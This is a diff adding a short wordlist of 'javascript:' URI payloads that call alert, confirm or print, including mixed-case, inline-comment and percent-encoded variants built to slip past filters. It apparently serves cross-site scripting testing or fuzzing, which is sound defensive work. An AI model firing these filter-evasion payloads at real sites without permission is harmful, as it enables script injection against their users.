@@ -1,0 +1,7 @@
+javascript:alert(1)
+javascript:confirm(1)
+javascript:print()
+JaVaScRiPt:alert(1)
+javascript:/*x*/alert(1)
+javascript:%61lert(1)
+
